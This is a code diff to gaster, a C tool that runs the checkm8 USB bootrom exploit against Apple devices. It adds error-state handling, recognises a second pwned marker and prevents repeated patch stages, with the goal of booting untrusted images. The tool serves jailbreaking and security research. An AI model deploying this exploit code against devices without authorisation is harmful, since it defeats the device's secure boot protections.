@@ -188,7 +188,8 @@ static enum {
 	STAGE_SPRAY,
 	STAGE_SETUP,
 	STAGE_PATCH,
-	STAGE_PWNED
+	STAGE_PWNED,
+	STAGE_ERROR
 } stage;
 static uint16_t cpid;
 static bool manual_reset;
@@ -902,7 +903,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x18000082A;
 		}
 		if(cpid != 0) {
-			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[checkm8]") != NULL;
+			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[checkm8]") != NULL || strstr(usb_serial_num, " PWND:[ipwnder]") != NULL;
 			ret = true;
 		}
 		free(usb_serial_num);
@@ -1129,6 +1130,9 @@ read_binary_file(const char *filename, uint8_t **buf, size_t *len) {
 		}
 		fclose(fp);
 	}
+	if(!ret) {
+		printf("Cannot read file \"%s\".\n", filename);
+	}
 	return ret;
 }
 
@@ -1294,21 +1298,30 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 						}
 					}
 					free(data);
+				} else {
+					stage = STAGE_ERROR;
 				}
+			} else {
+				stage = STAGE_ERROR;
 			}
 			free(payload_handle_checkm8_request);
+		} else {
+			stage = STAGE_ERROR;
 		}
 		free(payload);
+	} else {
+		stage = STAGE_ERROR;
 	}
 	return ret;
 }
 
 static bool
 gaster_checkm8(usb_handle_t *handle) {
+	static bool patched;
 	bool ret, pwned;
 
 	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
-	while(stage != STAGE_PWNED && wait_usb_handle(handle, 0, 0, checkm8_check_usb_device, &pwned)) {
+	while(stage != STAGE_PWNED && stage != STAGE_ERROR && wait_usb_handle(handle, 0, 0, checkm8_check_usb_device, &pwned)) {
 		if(!pwned) {
 			if(stage == STAGE_RESET) {
 				puts("Stage: RESET");
@@ -1326,19 +1339,25 @@ gaster_checkm8(usb_handle_t *handle) {
 				puts("Stage: SETUP");
 				ret = checkm8_stage_setup(handle);
 				stage = STAGE_PATCH;
-			} else {
+			} else if(!patched) {
 				puts("Stage: PATCH");
-				ret = checkm8_stage_patch(handle);
-			}
-			if(ret) {
-				puts("ret: true");
+				patched = ret = checkm8_stage_patch(handle);
 			} else {
-				puts("ret: false");
-				if(stage != STAGE_PATCH) {
-					stage = STAGE_RESET;
-				}
+				puts("Exploit failed.");
+				ret = false;
+				stage = STAGE_ERROR;
 			}
-			reset_usb_handle(handle);
+			if(stage != STAGE_ERROR) {
+				if(ret) {
+					puts("ret: true");
+				} else {
+					puts("ret: false");
+					if(stage != STAGE_PATCH) {
+						stage = STAGE_RESET;
+					}
+				}
+				reset_usb_handle(handle);
+			}
 		} else {
 			stage = STAGE_PWNED;
 			puts("Now you can boot untrusted images.");
